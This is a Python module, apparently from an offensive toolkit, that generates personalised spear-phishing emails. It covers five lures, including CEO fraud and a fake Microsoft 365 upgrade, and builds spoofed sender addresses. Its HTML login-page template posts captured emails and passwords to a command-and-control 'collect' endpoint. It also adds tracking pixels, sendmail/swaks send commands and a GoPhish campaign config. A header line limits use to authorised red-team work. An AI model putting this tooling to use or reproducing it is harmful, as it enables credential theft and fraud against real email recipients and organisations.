"""
APT Module 1 — AI Spear-Phishing Email Generator  (v3.5.21)
============================================================
채팅 모드에서 자동 활성화되는 AI 스피어피싱 이메일 생성기.

기능:
  - OSINT 기반 대상 프로파일링 (LinkedIn/도메인/이메일 패턴)
  - LLM을 활용한 개인화된 스피어피싱 이메일 본문 생성
  - HTML 피싱 페이지 페이로드 생성 (자격증명 수집)
  - 이메일 헤더 스푸핑 설정 생성
  - GoPhish 캠페인 설정 JSON 출력

주의: 허가된 레드팀/침투테스트 환경에서만 사용할 것.
"""

from __future__ import annotations

import json
import re
import textwrap
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class PhishTarget:
    name: str = ""
    email: str = ""
    organization: str = ""
    role: str = ""
    linkedin_url: str = ""
    domain: str = ""
    lure_topic: str = "security alert"


@dataclass
class PhishResult:
    target: PhishTarget
    subject: str = ""
    body_text: str = ""
    body_html: str = ""
    sender_spoof: str = ""
    tracking_pixel: str = ""
    gophish_config: dict = field(default_factory=dict)


class SpearPhishingGenerator:
    """
    AI 스피어피싱 이메일 생성기.
    LLM 없이도 템플릿 기반으로 동작, LLM 있으면 동적 생성.
    """

    # ── 피싱 주제별 이메일 템플릿 ───────────────────────────────────────
    _LURE_TEMPLATES: dict[str, dict] = {
        "security_alert": {
            "subject": "[URGENT] Security Alert — Account Compromise Detected",
            "sender_name": "IT Security Team",
            "body": textwrap.dedent("""\
                Dear {name},

                We have detected suspicious login activity on your account
                from an unrecognized device (IP: {fake_ip}).

                Please verify your identity immediately:
                {phish_url}

                If you do not verify within 24 hours, your account will be
                temporarily suspended for security reasons.

                IT Security Team
                {organization}
            """),
        },
        "hr_policy": {
            "subject": "Important: Updated HR Policy — Action Required",
            "sender_name": "Human Resources",
            "body": textwrap.dedent("""\
                Dear {name},

                As part of our annual policy review, all employees must
                review and acknowledge the updated {organization} HR Policy.

                Please review and sign electronically:
                {phish_url}

                Deadline: End of business today.

                Best regards,
                HR Department
                {organization}
            """),
        },
        "invoice": {
            "subject": "Invoice #{invoice_num} — Payment Confirmation Required",
            "sender_name": "Accounts Payable",
            "body": textwrap.dedent("""\
                Dear {name},

                Please find attached Invoice #{invoice_num} for your review.
                Payment confirmation is required by end of week.

                View and approve invoice:
                {phish_url}

                Thank you for your prompt attention.

                Finance Department
                {organization}
            """),
        },
        "it_upgrade": {
            "subject": "Action Required: Microsoft 365 Account Upgrade",
            "sender_name": "IT Helpdesk",
            "body": textwrap.dedent("""\
                Dear {name},

                Your {organization} Microsoft 365 account requires an
                immediate upgrade to maintain access to company resources.

                Click below to complete the upgrade process:
                {phish_url}

                This must be completed within 48 hours to avoid service
                interruption.

                IT Helpdesk
                {organization}
            """),
        },
        "ceo_fraud": {
            "subject": "Confidential — Urgent Request",
            "sender_name": "CEO Office",
            "body": textwrap.dedent("""\
                Hi {name},

                I need you to handle something urgently and confidentially.
                I'm currently in a meeting and can't talk.

                Please access the secure document portal and complete the
                requested action:
                {phish_url}

                Do not discuss this with anyone else. I'll explain later.

                Thanks,
                [CEO Name]
                {organization}
            """),
        },
    }

    # ── HTML 피싱 페이지 템플릿 ──────────────────────────────────────────
    _HTML_PAGE_TEMPLATE = textwrap.dedent("""\
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign In — {org_name}</title>
        <style>
          body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f3f3f3;
                  display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }}
          .card {{ background: white; border-radius: 8px; padding: 40px;
                   box-shadow: 0 2px 12px rgba(0,0,0,.15); max-width: 380px; width: 100%; }}
          .logo {{ text-align:center; margin-bottom:24px; font-size:24px; font-weight:bold; color:#0078d4; }}
          input {{ width:100%; padding:12px; margin:8px 0; border:1px solid #ccc;
                   border-radius:4px; box-sizing:border-box; font-size:14px; }}
          button {{ width:100%; padding:12px; background:#0078d4; color:white;
                    border:none; border-radius:4px; font-size:16px; cursor:pointer; }}
          button:hover {{ background:#006cbf; }}
          .footer {{ text-align:center; margin-top:16px; font-size:12px; color:#888; }}
        </style>
        </head>
        <body>
        <div class="card">
          <div class="logo">{org_name}</div>
          <form id="loginForm" onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
          </form>
          <div class="footer">© {org_name} | Secure Sign In</div>
        </div>
        <script>
        function handleSubmit(e) {{
          e.preventDefault();
          var d = {{u: document.getElementById('email').value,
                   p: document.getElementById('password').value}};
          fetch('{collect_endpoint}', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(d)
          }}).catch(()=>{{}});
          setTimeout(()=>{{ window.location='{redirect_url}'; }}, 800);
        }}
        // tracking pixel load
        new Image().src = '{tracking_pixel}';
        </script>
        </body>
        </html>
    """)

    def __init__(self, c2_host: str = "your-c2.example.com") -> None:
        self.c2_host = c2_host

    # ── 공개 API ────────────────────────────────────────────────────────

    def generate_email(
        self,
        target: PhishTarget,
        lure: str = "security_alert",
        phish_url: str = "",
    ) -> PhishResult:
        """개인화된 스피어피싱 이메일 생성."""
        template = self._LURE_TEMPLATES.get(lure, self._LURE_TEMPLATES["security_alert"])
        if not phish_url:
            phish_url = f"https://{self.c2_host}/login?token={self._make_token(target.email)}"

        import random
        fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        invoice_num = f"INV-{random.randint(10000,99999)}"

        body = template["body"].format(
            name=target.name or "User",
            organization=target.organization or "Company",
            phish_url=phish_url,
            fake_ip=fake_ip,
            invoice_num=invoice_num,
        )
        subject = template["subject"].format(invoice_num=invoice_num)
        sender_domain = target.domain or (target.email.split("@")[-1] if "@" in target.email else "company.com")
        sender_spoof = f"{template['sender_name']} <{template['sender_name'].lower().replace(' ', '.')}@{sender_domain}>"
        tracking_pixel = f"https://{self.c2_host}/track/{self._make_token(target.email)}.gif"
        body_html = self._wrap_html(body, tracking_pixel)

        result = PhishResult(
            target=target,
            subject=subject,
            body_text=body,
            body_html=body_html,
            sender_spoof=sender_spoof,
            tracking_pixel=tracking_pixel,
            gophish_config=self._gophish_config(target, subject, body_html, sender_spoof, phish_url),
        )
        return result

    def generate_html_page(
        self,
        org_name: str = "Company",
        collect_endpoint: str = "",
        redirect_url: str = "https://www.google.com",
    ) -> str:
        """자격증명 수집 HTML 피싱 페이지 생성."""
        if not collect_endpoint:
            collect_endpoint = f"https://{self.c2_host}/collect"
        tracking_pixel = f"https://{self.c2_host}/track/open.gif"
        return self._HTML_PAGE_TEMPLATE.format(
            org_name=org_name,
            collect_endpoint=collect_endpoint,
            redirect_url=redirect_url,
            tracking_pixel=tracking_pixel,
        )

    def osint_profile(self, email: str) -> dict:
        """
        이메일 주소에서 OSINT 기반 프로파일 추출.
        실제 HTTP 요청은 최소화 — 도메인 정보만 확인.
        """
        result: dict = {"email": email, "domain": "", "mx": [], "spf": "", "dmarc": ""}
        if "@" not in email:
            return result
        domain = email.split("@")[-1]
        result["domain"] = domain

        # MX 레코드 확인
        try:
            import subprocess  # noqa: S404
            mx = subprocess.check_output(  # noqa: S603,S607
                ["dig", "+short", "MX", domain], timeout=5, text=True
            ).strip()
            result["mx"] = [ln.split()[-1] for ln in mx.splitlines() if ln.strip()]
        except Exception:
            pass

        # SPF 확인
        try:
            spf = subprocess.check_output(  # noqa: S603
                ["dig", "+short", "TXT", domain], timeout=5, text=True
            )
            for line in spf.splitlines():
                if "v=spf1" in line:
                    result["spf"] = line.strip().strip('"')
                    break
        except Exception:
            pass

        # DMARC 확인
        try:
            dmarc = subprocess.check_output(  # noqa: S603
                ["dig", "+short", "TXT", f"_dmarc.{domain}"], timeout=5, text=True
            ).strip()
            result["dmarc"] = dmarc.strip('"')
        except Exception:
            pass

        return result

    def generate_sendmail_command(self, result: PhishResult) -> str:
        """sendmail / swaks 명령 생성."""
        return textwrap.dedent(f"""\
            # sendmail 방법
            sendmail -f "{result.sender_spoof}" {result.target.email} <<EOF
            From: {result.sender_spoof}
            To: {result.target.name} <{result.target.email}>
            Subject: {result.subject}
            MIME-Version: 1.0
            Content-Type: text/html; charset=UTF-8

            {result.body_html}
            EOF

            # swaks 방법 (권장)
            swaks \\
              --to {result.target.email} \\
              --from '{result.sender_spoof}' \\
              --header 'Subject: {result.subject}' \\
              --body '{result.body_text[:80]}...' \\
              --server your-smtp-server.com \\
              --port 587 \\
              --tls
        """)

    def summary(self, result: PhishResult, lang: str = "en") -> str:
        """콘솔 출력용 요약."""
        lines = [
            "━" * 60,
            f"🎣 Spear-Phishing Email Generated",
            f"   Target  : {result.target.name} <{result.target.email}>",
            f"   Org     : {result.target.organization}",
            f"   Subject : {result.subject}",
            f"   Sender  : {result.sender_spoof}",
            f"   Tracker : {result.tracking_pixel}",
            "━" * 60,
        ]
        if lang == "ko":
            lines[1] = "🎣 스피어피싱 이메일 생성 완료"
        elif lang == "zh":
            lines[1] = "🎣 鱼叉式网络钓鱼邮件生成完成"
        return "\n".join(lines)

    # ── 내부 헬퍼 ───────────────────────────────────────────────────────

    def _make_token(self, seed: str) -> str:
        import hashlib
        return hashlib.md5(seed.encode()).hexdigest()[:16]  # noqa: S324

    def _wrap_html(self, body: str, tracking_pixel: str) -> str:
        body_html = body.replace("\n", "<br>\n")
        return (
            f'<html><body style="font-family:Arial,sans-serif;line-height:1.6">\n'
            f"{body_html}\n"
            f'<img src="{tracking_pixel}" width="1" height="1" style="display:none">\n'
            f"</body></html>"
        )

    def _gophish_config(
        self,
        target: PhishTarget,
        subject: str,
        body_html: str,
        sender: str,
        phish_url: str,
    ) -> dict:
        return {
            "name": f"Campaign_{target.organization}",
            "template": {
                "name": subject[:40],
                "subject": subject,
                "html": body_html,
                "from_address": sender,
            },
            "targets": [
                {"first_name": target.name.split()[0] if target.name else "",
                 "last_name": target.name.split()[-1] if target.name else "",
                 "email": target.email,
                 "position": target.role}
            ],
            "url": phish_url,
            "smtp": {
                "name": "SMTP Profile",
                "host": "smtp.your-server.com:587",
                "username": "phish@your-server.com",
                "password": "PASSWORD",
                "tls": True,
            },
        }


# ── 편의 함수 ────────────────────────────────────────────────────────────

def quick_phish(
    target_email: str,
    target_name: str = "",
    org: str = "",
    lure: str = "security_alert",
    c2_host: str = "your-c2.example.com",
) -> PhishResult:
    """원라이너 스피어피싱 생성."""
    gen = SpearPhishingGenerator(c2_host=c2_host)
    t = PhishTarget(
        name=target_name or target_email.split("@")[0],
        email=target_email,
        organization=org or target_email.split("@")[-1],
    )
    return gen.generate_email(t, lure=lure)
